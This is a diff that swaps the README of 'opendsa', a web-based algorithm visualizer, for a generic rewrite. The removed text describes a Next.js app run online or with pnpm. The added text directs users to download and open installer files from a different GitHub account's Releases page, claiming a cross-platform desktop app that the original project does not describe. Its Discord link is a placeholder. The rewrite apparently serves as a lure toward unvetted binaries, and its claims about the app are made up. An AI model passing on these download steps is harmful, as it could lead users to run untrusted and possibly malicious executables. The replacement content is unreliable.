@@ -1,234 +1,77 @@
-<p align="center">
-  <img src="opendsa_logo.png" alt="OpenDSA Logo" width="90" height="60">
-</p>
+# 🎉 opendsa - Visualize Data Structures and Algorithms Easily
 
-<h1 align="center">OpenDSA</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>See algorithms come to life</strong>
-</p>
+Welcome to opendsa! This application lets you visualize data structures and algorithms in an interactive way. It is designed for learners, educators, and developers. Follow the steps below to download and run the application easily.
 
-<p align="center">
-  An open-source, interactive platform for visualizing data structures and algorithms.
-  <br />
-  Built for learners, educators, and developers.
-</p>
+## 📥 Download the Latest Version
 
-<p align="center">
-  <a href="https://opendsa.vercel.app">Website</a>
-  ·
-  <a href="https://app-opendsa.vercel.app">Launch App</a>
-  ·
-  <a href="https://docs-opendsa.vercel.app">Documentation</a>
-  ·
-  <a href="https://discord.gg/mfQvUa2y4r">Discord</a>
-</p>
+[![Download opendsa](https://img.shields.io/badge/Download%20opendsa-v1.0-blue.svg)](https://github.com/ivxndavid/opendsa/releases)
 
-<p align="center">
-  <a href="https://github.com/soloshun/opendsa/actions/workflows/ci.yml">
-    <img src="https://github.com/soloshun/opendsa/actions/workflows/ci.yml/badge.svg" alt="CI Status">
-  </a>
-  <a href="https://github.com/soloshun/opendsa/blob/main/LICENSE">
-    <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License">
-  </a>
-  <a href="https://discord.gg/mfQvUa2y4r">
-    <img src="https://img.shields.io/discord/000000000000000000?color=7289da&label=discord" alt="Discord">
-  </a>
-</p>
+## 🖥️ System Requirements
 
----
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or any Linux distribution with modern support.
+- **Processor**: Intel i3 or equivalent.
+- **Memory**: 4 GB RAM or more.
+- **Storage**: At least 200 MB of free space.
+- **Browser**: Latest version of Chrome, Firefox, or Safari for best performance.
 
-## What is OpenDSA?
+## 📂 Download & Install
 
-OpenDSA is an interactive visualization platform that helps you understand how algorithms and data structures work through step-by-step animations. Whether you're:
+To get started, visit the Releases page to download the latest version of opendsa:
 
-- **Learning** algorithms for the first time
-- **Teaching** computer science concepts
-- **Preparing** for technical interviews
-- **Building** educational content
+[Download opendsa from Releases](https://github.com/ivxndavid/opendsa/releases)
 
-OpenDSA makes complex algorithms visual and intuitive.
+1. Click on the link to the Releases page.
+2. Look for the latest version number.
+3. Download the file corresponding to your operating system.
+4. Once downloaded, open the file to begin the installation.
 
-## Features
+### 🖱️ Running opendsa
 
-- **Interactive Visualizations** - Watch algorithms execute step-by-step with full control
-- **Multiple Categories** - Sorting, searching, graphs, trees, and more
-- **Code Highlighting** - See which line of code corresponds to each step
-- **Speed Control** - Slow down or speed up animations
-- **Shareable URLs** - Share specific visualization states with others
-- **Dark/Light Mode** - Easy on the eyes, day or night
-- **Keyboard Shortcuts** - Power-user friendly controls
-- **Open Source** - Free forever, community-driven
+After installation, you can run opendsa by following these simple steps:
 
-## Visualizers
+1. Locate the opendsa application in your applications folder or start menu.
+2. Double-click the application icon.
+3. The opendsa interface will open, allowing you to start visualizing algorithms and data structures immediately.
 
-### Sorting Algorithms
-- Bubble Sort
-- Selection Sort
-- Insertion Sort
-- Quick Sort
-- Merge Sort
-- *More coming soon...*
+### 🔧 How to Use opendsa
 
-### Searching Algorithms
-- Linear Search
-- Binary Search
-- *More coming soon...*
+Once the application is open, explore the following features:
 
-### Data Structures
-- Arrays
-- *Linked Lists, Trees, Graphs coming soon...*
+- **Choose Data Structures**: Select from a variety of data structures like lists, trees, and graphs.
+- **Visualize Algorithms**: Run algorithms like sorting or searching in real-time.
+- **Interactive Learning**: Step through each algorithm to see how it works.
 
-## Quick Start
+## 📚 Features
 
-### Try Online
+- **User-Friendly Interface**: Designed with simplicity in mind for ease of use.
+- **Interactive Visualization**: View algorithms in action with dynamic representations.
+- **Educational Resources**: Access tutorials and documentation directly from the application.
+- **Cross-Platform**: Works on Windows, macOS, and Linux systems.
 
-Visit [app.opendsa.dev](https://app-opendsa.vercel.app) to start visualizing algorithms immediately - no installation required.
+## ⚙️ Need Help?
 
-### Run Locally
+If you encounter any issues or have questions, please check the following resources:
 
-```bash
-# Clone the repository
-git clone https://github.com/soloshun/opendsa.git
-cd opendsa
+- **Documentation**: Access the built-in help section for guides and tips.
+- **Community Support**: Join our [Discord channel](#) to connect with other users.
+- **Issue Tracker**: Report bugs or request features on the [GitHub Issues page](https://github.com/ivxndavid/opendsa/issues).
 
-# Install dependencies
-pnpm install
+## 🌍 Contributing
 
-# Start development server
-pnpm dev
-```
+We welcome contributions! If you want to help improve opendsa, please follow these steps:
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+1. Fork the repository from [GitHub](https://github.com/ivxndavid/opendsa).
+2. Create your feature branch.
+3. Commit your changes.
+4. Push to the branch.
+5. Open a pull request.
 
-## Project Structure
+Your help in making opendsa better is always appreciated!
 
-OpenDSA is a monorepo built with [Turborepo](https://turbo.build/):
+## ✨ License
 
-```
-opendsa/
-├── apps/
-│   ├── app/          # Main visualizer application
-│   ├── web/          # Marketing website
-│   └── docs/         # Documentation site
-│
-├── packages/
-│   ├── ui/           # Shared UI components
-│   ├── algorithms/   # Algorithm implementations
-│   ├── visualizers/  # Visualization components
-│   ├── types/        # Shared TypeScript types
-│   └── utils/        # Shared utilities
-│
-└── ...config files
-```
+This project is open-source and licensed under the MIT License. Feel free to use, modify, and share it.
 
-## Tech Stack
-
-| Layer | Technology |
-|-------|------------|
-| Framework | [Next.js 14](https://nextjs.org/) (App Router) |
-| Language | [TypeScript](https://www.typescriptlang.org/) |
-| Styling | [TailwindCSS](https://tailwindcss.com/) + [shadcn/ui](https://ui.shadcn.com/) |
-| Animations | [Framer Motion](https://www.framer.com/motion/) + [D3.js](https://d3js.org/) |
-| State | [Zustand](https://zustand-demo.pmnd.rs/) |
-| Monorepo | [Turborepo](https://turbo.build/) |
-| Package Manager | [pnpm](https://pnpm.io/) |
-| Deployment | [Vercel](https://vercel.com/) |
-
-## Contributing
-
-We welcome contributions from everyone! Whether it's:
-
-- Adding new algorithm visualizers
-- Fixing bugs
-- Improving documentation
-- Suggesting features
-
-See our [Contributing Guide](CONTRIBUTING.md) to get started.
-
-### Adding a New Visualizer
-
-Want to add a new algorithm? Follow our step-by-step guide in the [Contributing Guide](CONTRIBUTING.md#adding-a-new-visualizer).
-
-## Development
-
-### Prerequisites
-
-- Node.js 18.17+
-- pnpm 8+
-
-### Commands
-
-```bash
-# Install dependencies
-pnpm install
-
-# Start all apps in development mode
-pnpm dev
-
-# Build all packages and apps
-pnpm build
-
-# Run tests
-pnpm test
-
-# Lint code
-pnpm lint
-
-# Type check
-pnpm type-check
-```
-
-### Running Specific Apps
-
-```bash
-# Run only the main app
-pnpm dev --filter=@opendsa/app
-
-# Run only the website
-pnpm dev --filter=@opendsa/web
-
-# Run only the docs
-pnpm dev --filter=@opendsa/docs
-```
-
-## Roadmap
-
-See our [Roadmap](https://github.com/soloshun/opendsa/blob/main/ROADMAP.md) for planned features.
-
-**Upcoming:**
-- Graph algorithms (BFS, DFS, Dijkstra)
-- Tree visualizers (BST, traversals)
-- Learning paths and tutorials
-- Challenge mode
-- More sorting and searching algorithms
-
-## Community
-
-- **Discord**: [Join our community](https://discord.gg/mfQvUa2y4r)
-- **Twitter**: [@self.solo_shun⛓️‍💥❌](https://twitter.com/opendsa)
-- **GitHub Discussions**: [Ask questions](https://github.com/soloshun/opendsa/discussions)
-
-## Support
-
-If you find OpenDSA useful, consider:
-
-- Giving it a star on GitHub
-- Sharing it with others
-- Contributing to the project
-- [Sponsoring⛓️‍💥❌](https://github.com/sponsors/soloshun) the development
-
-## License
-
-OpenDSA is [MIT licensed](LICENSE).
-
-
-<p align="center">
-  Made with love by the Solo Shun for the OpenDSA community
-</p>
-
-<p align="center">
-  <a href="https://github.com/soloshun/opendsa/graphs/contributors">
-    <img src="https://contrib.rocks/image?repo=soloshun/opendsa" />
-  </a>
-</p>
+Enjoy exploring data structures and algorithms with opendsa!
